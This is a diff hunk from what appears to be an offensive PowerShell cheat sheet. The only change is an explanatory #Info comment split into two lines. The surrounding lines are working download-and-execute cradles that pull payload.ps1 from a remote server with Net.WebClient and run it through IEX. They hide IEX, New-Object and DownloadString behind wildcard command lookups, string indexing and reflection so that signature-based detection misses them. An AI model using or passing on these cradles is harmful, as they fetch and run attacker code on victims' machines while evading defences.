@@ -21,7 +21,8 @@ ps> &( ([String]''.Normalize)[23,15,46]-Join'')(([Char[]](New-Object Net.WebClie
 ps> $ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name)|Member|?{$_.Name-clike'*S*i*t'}).Name).Invoke((New-Object Net.WebClient).DownloadString('http://server/payload.ps1'))
 ps> &( (Get-ChildItem Variable:P*ho*).Value[4]+$PsHome[30]+'x')(.(Get-Command N*-O*)Net.WebClient).(((((.(Get-Command N*-O*)Net.WebClient)).PsObject.Methods)|Where-Object{(Get-Variable _ -Value).Name-clike'*wn*d*g'}).Name).Invoke('https://server/payload.ps1')
 
-#Info: &(GAL IE*) = Alias IEX; .(Get-Command N*ct) = New-Object; .(((((.(Get-Command N*ct)Net.WebClient)).PsObject.Methods)|Where{(Variable _ -ValueOn).Name-like'*nl*g'}).Name).Invoke = Downloadstring
+#Info: &(GAL IE*) = Alias IEX; .(Get-Command N*ct) = New-Object
+#Info: .(((((.(Get-Command N*ct)Net.WebClient)).PsObject.Methods)|Where{(Variable _ -ValueOn).Name-like'*nl*g'}).Name).Invoke = Downloadstring
 ps> &(GAL IE*)((.(Get-Command N*ct)Net.WebClient).(((((.(Get-Command N*ct)Net.WebClient)).PsObject.Methods)|Where{(Variable _ -ValueOn).Name-like'*nl*g'}).Name).Invoke("ht"+"tps://server/payload.ps1"))
 
 
